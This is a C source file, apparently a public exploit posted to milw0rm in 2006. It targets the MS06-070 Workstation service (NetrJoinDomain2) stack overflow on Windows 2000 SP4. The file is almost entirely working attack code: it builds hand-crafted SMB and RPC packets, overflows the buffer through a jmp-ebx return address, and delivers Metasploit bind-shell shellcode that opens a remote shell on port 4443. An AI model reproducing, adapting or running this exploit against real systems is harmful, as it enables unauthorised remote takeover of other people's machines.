/***************************************************************************

Microsoft Windows Wkssvc NetrJoinDomain2 Stack Overflow(MS06-070) Exploit

by cocoruder(frankruder_at_hotmail.com),2006.11.15
page:http://ruder.cdut.net/default.asp

Code fixed by S A Stevens - 17.11.2006 - changed shellcode, Changed code to
correct jmp EBX address and fixed exploit output status.

Greetz to InTel

Should work on Windows 2000 Server SP4 (All Languages)


usage:
ms06070 targetip DomainName

notice:
Make sure the DomainName is valid and live,more informations see
http://research.eeye.com/html/advisories/published/AD20061114.html,
cocoruder just research the vulnerability and give the exploit for
Win2000.
****************************************************************************/


#include <stdio.h>
#include <windows.h>
#include <winsock.h>
#include <tchar.h>
#pragma comment(lib, "wsock32.lib")


unsigned char SmbNeg[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";


unsigned char Session_Setup_AndX_Request[]=
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";


unsigned char TreeConnect_AndX_Request[]=
"\x00\x00\x00\x58\xff\x53\x4d\x42\x75\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xff\xfe\x00\x08\x00\x03\x04\xff\x00\x58\x00\x08"
"\x00\x01\x00\x2d\x00\x00\x5c\x00\x5c\x00\x31\x00\x37\x00\x32\x00"
"\x2e\x00\x32\x00\x32\x00\x2e\x00\x35\x00\x2e\x00\x34\x00\x36\x00"
"\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f"
"\x3f\x00";


unsigned char NTCreate_AndX_Request[]=
"\x00\x00\x00\x64\xff\x53\x4d\x42\xa2\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\x04\x0c\x00\x08\x00\x01\x18\xff\x00\xde\xde\x00"
"\x0e\x00\x16\x00\x00\x00\x00\x00\x00\x00\x9f\x01\x02\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00"
"\x00\x00\x40\x00\x40\x00\x02\x00\x00\x00\x01\x11\x00\x00\x5c\x00"
"\x77\x00\x6b\x00\x73\x00\x73\x00\x76\x00\x63\x00\x00\x00";


unsigned char Rpc_Bind_Wkssvc[]=
"\x00\x00\x00\x92\xff\x53\x4d\x42\x25\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x01\x08\xf0\x0b\x03\x08\xf7\x4c\x10\x00\x00\x48\x00\x00"
"\x04\xe0\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a"
"\x00\x48\x00\x4a\x00\x02\x00\x26\x00\x01\x40\x4f\x00\x5c\x50\x49"
"\x50\x45\x5c\x00\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00"
"\x00\x00\x00\x00\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x01\x00\x98\xd0\xff\x6b\x12\xa1\x10\x36\x98\x33\x46\xc3"
"\xf8\x7e\x34\x5a\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11"
"\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00";


unsigned char Rpc_NetrJoinDomain2_Header[]=
"\x00\x00\x00\xa8\xff\x53\x4d\x42\x25\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\x6c\x07\x00\x08\xc0\x01\x10\x00\x00\x54\x00\x00"
"\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54"
"\x00\x54\x00\x54\x00\x02\x00\x26\x00\x00\x40\x65\x00\x00\x5c\x00"
"\x50\x00\x49\x00\x50\x00\x45\x00\x5c\x00\x00\x00\x00\x00\x05\x00"
"\x00\x03\x10\x00\x00\x00\x54\x00\x00\x00\x01\x00\x00\x00\x3c\x00"
"\x00\x00\x00\x00"
"\x16\x00"     //opnum,NetrJoinDomain2
"\x30\x2a\x42\x00"
"\x0e\x00\x00\x00"
"\x00\x00\x00\x00"
"\x0e\x00\x00\x00"
"\x5c\x00\x5c\x00\x31\x00\x37\x00\x32\x00"
"\x2e\x00\x32\x00\x32\x00\x2e\x00\x35\x00\x2e\x00\x34\x00\x31\x00"
"\x00\x00"
"\x10\x01\x00\x00"
"\x00\x00\x00\x00"
"\x10\x01\x00\x00";


unsigned char Rpc_NetrJoinDomain2_End[]=
"\x00\x00\x00\x00"
"\x00\x00\x00\x00"
"\x00\x00\x00\x00"
"\x01\x00\x00\x00";


unsigned char *lpDomainName=NULL;
DWORD   dwDomainNameLen=0;



/* win32_bind -  EXITFUNC=seh LPORT=4443 Size=344 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char shellcode[] =
"\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe9"
"\x59\x23\xce\x83\xeb\xfc\xe2\xf4\x15\x33\xc8\x83\x01\xa0\xdc\x31"
"\x16\x39\xa8\xa2\xcd\x7d\xa8\x8b\xd5\xd2\x5f\xcb\x91\x58\xcc\x45"
"\xa6\x41\xa8\x91\xc9\x58\xc8\x87\x62\x6d\xa8\xcf\x07\x68\xe3\x57"
"\x45\xdd\xe3\xba\xee\x98\xe9\xc3\xe8\x9b\xc8\x3a\xd2\x0d\x07\xe6"
"\x9c\xbc\xa8\x91\xcd\x58\xc8\xa8\x62\x55\x68\x45\xb6\x45\x22\x25"
"\xea\x75\xa8\x47\x85\x7d\x3f\xaf\x2a\x68\xf8\xaa\x62\x1a\x13\x45"
"\xa9\x55\xa8\xbe\xf5\xf4\xa8\x8e\xe1\x07\x4b\x40\xa7\x57\xcf\x9e"
"\x16\x8f\x45\x9d\x8f\x31\x10\xfc\x81\x2e\x50\xfc\xb6\x0d\xdc\x1e"
"\x81\x92\xce\x32\xd2\x09\xdc\x18\xb6\xd0\xc6\xa8\x68\xb4\x2b\xcc"
"\xbc\x33\x21\x31\x39\x31\xfa\xc7\x1c\xf4\x74\x31\x3f\x0a\x70\x9d"
"\xba\x0a\x60\x9d\xaa\x0a\xdc\x1e\x8f\x31\x32\x95\x8f\x0a\xaa\x2f"
"\x7c\x31\x87\xd4\x99\x9e\x74\x31\x3f\x33\x33\x9f\xbc\xa6\xf3\xa6"
"\x4d\xf4\x0d\x27\xbe\xa6\xf5\x9d\xbc\xa6\xf3\xa6\x0c\x10\xa5\x87"
"\xbe\xa6\xf5\x9e\xbd\x0d\x76\x31\x39\xca\x4b\x29\x90\x9f\x5a\x99"
"\x16\x8f\x76\x31\x39\x3f\x49\xaa\x8f\x31\x40\xa3\x60\xbc\x49\x9e"
"\xb0\x70\xef\x47\x0e\x33\x67\x47\x0b\x68\xe3\x3d\x43\xa7\x61\xe3"
"\x17\x1b\x0f\x5d\x64\x23\x1b\x65\x42\xf2\x4b\xbc\x17\xea\x35\x31"
"\x9c\x1d\xdc\x18\xb2\x0e\x71\x9f\xb8\x08\x49\xcf\xb8\x08\x76\x9f"
"\x16\x89\x4b\x63\x30\x5c\xed\x9d\x16\x8f\x49\x31\x16\x6e\xdc\x1e"
"\x62\x0e\xdf\x4d\x2d\x3d\xdc\x18\xbb\xa6\xf3\xa6\x19\xd3\x27\x91"
"\xba\xa6\xf5\x31\x39\x59\x23\xce";


DWORD    fill_len_1 =0x84c;     //fill data
DWORD    fill_len_2 =0x1000;    //fill rubbish data
DWORD    addr_jmp_ebx=0x77F92A9B;   //jmp ebx address,in ntdll.dll
unsigned char  code_jmp8[]=      //jmp 8
"\xEB\x06\x90\x90";

unsigned char  *Rpc_NetrJoinDomain2=NULL;
DWORD    dwRpc_NetrJoinDomain2=0;


unsigned char  recvbuff[2048];


void showinfo(void)
{
 printf("Microsoft Windows Wkssvc NetrJoinDomain2 Stack Overflow(MS06-070) Exploit\n");
 printf("by cocoruder(frankruder_at_hotmail.com),2006.10.15\n");
 printf("page:http://ruder.cdut.net/default.asp\n\n");
 printf("Code fixed by S A Stevens - 16.11.2006\n");
 printf("Should work on Windows 2000 Server SP4 (All Languages)\n\n");
 printf("usage:\n");
 printf("ms06070 targetip DomainName\n\n");
 printf("notice:\n");
 printf("Make sure the DomainName is valid and live,more informations see\n");
 printf("http://research.eeye.com/html/advisories/published/AD20061114.html,\n");
 printf("cocoruder just research the vulnerability and give the exploit for Win2000.\n\n\n");

}

void neg ( int s )
{
 char response[1024];

 memset(response,0,sizeof(response));

 send(s,(char *)SmbNeg,sizeof(SmbNeg)-1,0);
}



void MakeAttackPacket(char *lpDomainNameStr)
{
 DWORD  j,len,b_flag;



 dwDomainNameLen=(strlen(lpDomainNameStr)+2)*2;
 lpDomainName=(unsigned char *)malloc(dwDomainNameLen);

 memset(lpDomainName,0,dwDomainNameLen);

MultiByteToWideChar(CP_ACP,0,lpDomainNameStr,-1,(LPWSTR)lpDomainName,dwDomainNameLen);

 *(unsigned char *)(lpDomainName+dwDomainNameLen-2)=0x5C;
 *(unsigned char *)(lpDomainName+dwDomainNameLen-4)=0x5C;

 len=dwDomainNameLen+     //DomainName
 fill_len_1-3*2+      //fill_len_1
 4+         //jmp 8
 4+         //addr jmp ebx
 sizeof(shellcode)-1+    //shellcode
 fill_len_2+       //fill_len_2
 2;         //0x0000

 b_flag=0;
 if (len%2==1)
 {
 len++;
 b_flag=1;
 }


 dwRpc_NetrJoinDomain2=sizeof(Rpc_NetrJoinDomain2_Header)-1+
       len+
       sizeof(Rpc_NetrJoinDomain2_End)-1; //end


 //malloc
 Rpc_NetrJoinDomain2=(unsigned char *)malloc(dwRpc_NetrJoinDomain2);
 if (Rpc_NetrJoinDomain2==NULL)
 {
 printf("malloc error!\n");
 return;
 }

 //fill nop
 memset(Rpc_NetrJoinDomain2,0x90,dwRpc_NetrJoinDomain2);


 j=sizeof(Rpc_NetrJoinDomain2_Header)-1;

 //update para1 length
 *(DWORD *)(Rpc_NetrJoinDomain2_Header+j-0x0c)=len/2;
 *(DWORD *)(Rpc_NetrJoinDomain2_Header+j-0x04)=len/2;


 //copy header

memcpy(Rpc_NetrJoinDomain2,Rpc_NetrJoinDomain2_Header,sizeof(Rpc_NetrJoinDomain2_Header)-1);

 j=sizeof(Rpc_NetrJoinDomain2_Header)-1;

 //copy DomainName
 memcpy(Rpc_NetrJoinDomain2+j,lpDomainName,dwDomainNameLen);
 j=j+dwDomainNameLen;

 //calculate offset
 j=j+fill_len_1-3*2;

 //jmp 8
 memcpy(Rpc_NetrJoinDomain2+j,code_jmp8,sizeof(code_jmp8)-1);
 j=j+4;

 //jmp ebx address
 *(DWORD *)(Rpc_NetrJoinDomain2+j)=addr_jmp_ebx;
 j=j+4;

 //copy shellcode
 memcpy(Rpc_NetrJoinDomain2+j,shellcode,sizeof(shellcode)-1);
 j=j+sizeof(shellcode)-1;

 //fill data
 memset(Rpc_NetrJoinDomain2+j,0x41,fill_len_2);
 j=j+fill_len_2;

 //0x0000(NULL)
 if (b_flag==0)
 {
 Rpc_NetrJoinDomain2[j]=0x00;
 Rpc_NetrJoinDomain2[j+1]=0x00;
 j=j+2;
 }
 else if (b_flag==1)
 {
 Rpc_NetrJoinDomain2[j]=0x00;
 Rpc_NetrJoinDomain2[j+1]=0x00;
 Rpc_NetrJoinDomain2[j+2]=0x00;
 j=j+3;
 }


 //copy other parameter

memcpy(Rpc_NetrJoinDomain2+j,Rpc_NetrJoinDomain2_End,sizeof(Rpc_NetrJoinDomain2_End)-1);

 j=j+sizeof(Rpc_NetrJoinDomain2_End)-1;


}



void main(int argc,char **argv)
{
 WSADATA    ws;
 struct sockaddr_in server;
   SOCKET    sock;
 DWORD    ret;
 WORD    userid,treeid,fid;


 WSAStartup(MAKEWORD(2,2),&ws);




   sock = socket(AF_INET,SOCK_STREAM,0);
   if(sock<=0)
 {
       return;
 }

   server.sin_family = AF_INET;
   server.sin_addr.s_addr = inet_addr(argv[1]);
   server.sin_port = htons((USHORT)445);

 printf("[+] Connecting %s\n",argv[1]);

   ret=connect(sock,(struct sockaddr *)&server,sizeof(server));
 if (ret==-1)
 {
 printf("Connection Error, Port 445 Firewalled?\n");
 return;
 }


 neg(sock);

 recv(sock,(char *)recvbuff,sizeof(recvbuff),0);

 ret=send(sock,(char *)Session_Setup_AndX_Request,sizeof(Session_Setup_AndX_Request)-1,0);
 if (ret<=0)
 {
 printf("send Session_Setup_AndX_Request error!\n");
 return;
 }
 recv(sock,(char *)recvbuff,sizeof(recvbuff),0);

 userid=*(WORD *)(recvbuff+0x20);       //get userid


 memcpy(TreeConnect_AndX_Request+0x20,(char *)&userid,2); //update userid


 ret=send(sock,(char *)TreeConnect_AndX_Request,sizeof(TreeConnect_AndX_Request)-1,0);
 if (ret<=0)
 {
 printf("send TreeConnect_AndX_Request error!\n");
 return;
 }
 recv(sock,(char *)recvbuff,sizeof(recvbuff),0);

 treeid=*(WORD *)(recvbuff+0x1c);       //get treeid


 //send NTCreate_AndX_Request
 memcpy(NTCreate_AndX_Request+0x20,(char *)&userid,2);  //update userid
 memcpy(NTCreate_AndX_Request+0x1c,(char *)&treeid,2);  //update treeid


 ret=send(sock,(char
*)NTCreate_AndX_Request,sizeof(NTCreate_AndX_Request)-1,0);
 if (ret<=0)
 {
 printf("send NTCreate_AndX_Request error!\n");
 return;
 }
 recv(sock,(char *)recvbuff,sizeof(recvbuff),0);


 fid=*(WORD *)(recvbuff+0x2a);        //get fid


 //rpc bind

 memcpy(Rpc_Bind_Wkssvc+0x20,(char *)&userid,2);
 memcpy(Rpc_Bind_Wkssvc+0x1c,(char *)&treeid,2);
 memcpy(Rpc_Bind_Wkssvc+0x43,(char *)&fid,2);
 *(DWORD *)Rpc_Bind_Wkssvc=htonl(sizeof(Rpc_Bind_Wkssvc)-1-4);

 ret=send(sock,(char *)Rpc_Bind_Wkssvc,sizeof(Rpc_Bind_Wkssvc)-1,0);
 if (ret<=0)
 {
 printf("send Rpc_Bind_Wkssvc error!\n");
 return;
 }
 recv(sock,(char *)recvbuff,sizeof(recvbuff),0);


 MakeAttackPacket((char *)argv[2]);


 memcpy(Rpc_NetrJoinDomain2+0x20,(char *)&userid,2);
 memcpy(Rpc_NetrJoinDomain2+0x1c,(char *)&treeid,2);
 memcpy(Rpc_NetrJoinDomain2+0x43,(char *)&fid,2);
 *(DWORD *)Rpc_NetrJoinDomain2=htonl(dwRpc_NetrJoinDomain2-4);

 *(WORD *)(Rpc_NetrJoinDomain2+0x27)=dwRpc_NetrJoinDomain2-0x58;  //update Total Data Count
 *(WORD *)(Rpc_NetrJoinDomain2+0x3b)=dwRpc_NetrJoinDomain2-0x58;  //update Data Count
 *(WORD *)(Rpc_NetrJoinDomain2+0x45)=dwRpc_NetrJoinDomain2-0x47;  //update Byte Count
 *(WORD *)(Rpc_NetrJoinDomain2+0x60)=dwRpc_NetrJoinDomain2-0x58;  //update Frag Length

 ret=send(sock,(char *)Rpc_NetrJoinDomain2,dwRpc_NetrJoinDomain2,0);
 if (ret<=0)
 {
 printf("send Rpc_NetrJoinDomain2 error!\n");
 return;
 }

 printf("[+] Sent attack packet successfully, Try telnet on %s:4443?\n",argv[1]);

 recv(sock,(char *)recvbuff,sizeof(recvbuff),0);




 closesocket(sock);

}

// milw0rm.com [2006-11-17]
